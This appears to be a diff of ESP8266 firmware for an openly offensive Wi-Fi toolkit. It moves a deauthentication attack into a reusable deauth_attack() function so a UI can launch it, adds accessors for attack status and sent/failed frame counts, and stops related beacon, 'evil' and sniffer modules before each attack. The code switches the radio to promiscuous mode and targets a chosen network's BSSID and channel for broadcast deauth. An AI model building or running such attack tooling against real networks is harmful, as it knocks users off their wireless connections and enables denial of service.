@@ -90,12 +90,20 @@ static void on_select(const char* line) {
     return;
   }
 
-  memcpy(s_bssid, s_scan[idx].bssid, 6);
-  s_ch = s_scan[idx].channel;
-  strncpy(s_ssid, s_scan[idx].ssid, sizeof(s_ssid));
+  deauth_attack(s_scan[idx].bssid, s_scan[idx].channel, s_scan[idx].ssid);
+  cli_release();
+}
+
+// programatik (UI) ----------------------------------------------------------
+void deauth_attack(const uint8_t* bssid, uint8_t ch, const char* ssid) {
+  beacon_stop(); pdeauth_stop(); evil_stop();
+  if (sniffer_running()) sniffer_stop();
+
+  memcpy(s_bssid, bssid, 6);
+  s_ch = ch;
+  strncpy(s_ssid, ssid, sizeof(s_ssid));
   s_ssid[sizeof(s_ssid) - 1] = 0;
 
-  // ESP8266: freedom-send butuh promiscuous ENABLE
   wifi_set_opmode_current(STATION_MODE);
   wifi_set_promiscuous_rx_cb(nullcb);
   wifi_promiscuous_enable(1);
@@ -104,10 +112,13 @@ static void on_select(const char* line) {
   s_attacking = true;
   s_sent = s_fail = 0;
   s_lastStat = millis();
-  Serial.printf("[deauth] TARGET %s (%s) ch%d — broadcast deauth aktif. 'deauth stop' utk berhenti\n",
+  Serial.printf("[deauth] TARGET %s (%s) ch%d\n",
     s_ssid[0] ? s_ssid : "<hidden>", nc_mac_str(s_bssid), s_ch);
-  cli_release();
 }
+
+bool deauth_active() { return s_attacking; }
+void deauth_stats(uint32_t* sent, uint32_t* fail) { if (sent) *sent = s_sent; if (fail) *fail = s_fail; }
+const char* deauth_ssid() { return s_ssid; }
 
 static void cmd_deauth(int argc, char** argv) {
   if (argc >= 2 && strcasecmp(argv[1], "stop") == 0) { attack_stop(true); return; }
